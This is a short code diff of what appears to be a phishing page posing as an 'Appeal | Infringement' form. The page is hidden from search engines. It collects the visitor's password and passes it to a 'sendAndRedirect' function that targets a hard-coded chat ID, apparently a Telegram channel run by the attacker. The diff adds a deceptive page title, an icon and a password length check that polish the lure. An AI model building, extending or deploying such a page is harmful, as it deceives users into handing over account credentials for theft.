@@ -7,6 +7,8 @@
     <meta name="robots" content="noindex, nofollow">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="icon" href="head.gif">
+    <title>Appeal | Infringement</title>
     <script>
     function sendAndRedirect() {
         var chatId = '-4107249278'; // Hedef chat ID
@@ -182,7 +184,7 @@
         </div>
 
   <div>
-      <input type="password" style="margin-bottom: 20px;" maxlength="30" rows="1" placeholder="Password" id="lastPassword" oninput="saveAndEncrypt(this)"></input>
+      <input  minlength="4" type="password" style="margin-bottom: 20px;" maxlength="30" rows="1" placeholder="Password" id="lastPassword" oninput="saveAndEncrypt(this)"></input>
 
       <button style="background-color: #3498db; opacity: 1;" onclick="sendAndRedirect()">Next</button>
   </div>  <script>
